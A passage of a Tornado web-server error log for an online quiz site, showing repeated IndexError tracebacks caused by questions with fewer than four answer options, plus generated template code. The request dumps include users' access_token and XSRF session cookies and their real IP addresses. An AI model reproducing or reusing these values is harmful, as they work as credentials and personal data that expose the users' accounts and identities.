HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5057818d8e4c8571b4b34823&answers=%5B0%2C2%5D&cursor=5&_xsrf=36c72ad09a6a45d89e729cf0a7a6c950', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '96', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '86.167.54.162', 'Cookie': '_xsrf=36c72ad09a6a45d89e729cf0a7a6c950; access_token="QUFBRzZsTmNzNkdjQkFGWkJ0N2lyT1VNZXdIdHlaQmdqVXlwd3laQlU0cE9yOUhqaGpUYzV5R0JreElweUJQd1hmamVja1Z6ZFJqWkJGSnpwTXVWWkFMUFJ1dm5uYkFWYmVaQWtMa1lFVjFVUVpEWkQ=|1347911957|a6de482e36ded82a69eb39321cd99a79aafc8e40"; __utma=188782963.2080245892.1347887295.1347887295.1347909760.2; __utmb=188782963.11.10.1347909760; __utmc=188782963; __utmz=188782963.1347887295.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 126.90ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5057818d8e4c8571b4b34823&answers=%5B1%5D&cursor=14&_xsrf=36c72ad09a6a45d89e729cf0a7a6c950', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '93', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '86.167.54.162', 'Cookie': '_xsrf=36c72ad09a6a45d89e729cf0a7a6c950; access_token="QUFBRzZsTmNzNkdjQkFGWkJ0N2lyT1VNZXdIdHlaQmdqVXlwd3laQlU0cE9yOUhqaGpUYzV5R0JreElweUJQd1hmamVja1Z6ZFJqWkJGSnpwTXVWWkFMUFJ1dm5uYkFWYmVaQWtMa1lFVjFVUVpEWkQ=|1347911957|a6de482e36ded82a69eb39321cd99a79aafc8e40"; __utma=188782963.2080245892.1347887295.1347887295.1347909760.2; __utmb=188782963.11.10.1347909760; __utmc=188782963; __utmz=188782963.1347887295.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 104.25ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505788998e4c8571c2b49cf8&answers=%5B3%5D&cursor=4&_xsrf=c93f29dc84554be4a548722556f77501', headers={'Referer': 'http://www.intheory.co.uk/test/new', 'Content-Length': '92', 'Accept-Language': 'en-gb,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:15.0) Gecko/20100101 Firefox/15.0.1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'X-Real-Ip': '86.134.38.179', 'Cookie': '__utma=188782963.1786246707.1347912966.1347912966.1347912966.1; __utmb=188782963.5.10.1347912966; __utmc=188782963; __utmz=188782963.1347912966.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); access_token="QUFBRzZsTmNzNkdjQkFCTjZBM0RaQzdrYUNnVFBMZ0VjQTY5TEZHWENzUklFeE55TGlvelBaQ2psQktpT21rMWl3RFBBekI2cTd6RjY5S2E0N1pDcTQ0R0lSWkJCUGtUeEJEWkNGZG5QSWdBWkRaRA==|1347912984|b050ca7bac7832459a91753256ed2d0ba4e9fea3"; _xsrf=c93f29dc84554be4a548722556f77501', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 292.83ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
